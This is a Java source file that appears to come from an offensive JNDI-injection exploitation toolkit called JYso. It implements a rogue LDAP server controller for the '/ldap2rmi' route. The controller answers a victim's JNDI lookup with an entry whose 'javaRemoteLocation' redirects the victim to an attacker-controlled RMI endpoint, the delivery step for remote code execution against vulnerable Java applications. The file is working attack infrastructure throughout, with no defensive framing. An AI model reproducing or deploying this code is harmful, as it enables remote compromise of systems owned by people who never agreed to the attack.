package com.qi4l.JYso.controllers;

import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedActionTypeException;
import com.qi4l.JYso.exceptions.UnSupportedGadgetTypeException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.fusesource.jansi.Ansi;

import java.util.Random;

@LdapMapping(uri = {"/ldap2rmi"})
public class ldap2rmiController implements LdapController {

    private final String ip      = Config.ip;
    private final String rmiPort = String.valueOf(Config.rmiPort);
    private       String path;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("- Change LDAP to RMI ");


        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaRemoteLocation", "rmi://" + ip + ":" + rmiPort + path);

        System.out.println(Ansi.ansi().fgBrightMagenta().a("  redirecting to: " + "rmi://" + ip + ":" + rmiPort + path).reset());

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException, UnSupportedActionTypeException {
        base = base.replace('\\', '/');
        int index = base.indexOf('/');
        if (index != -1) {
            String result = base.substring(index);
            path = result;
        }
    }
}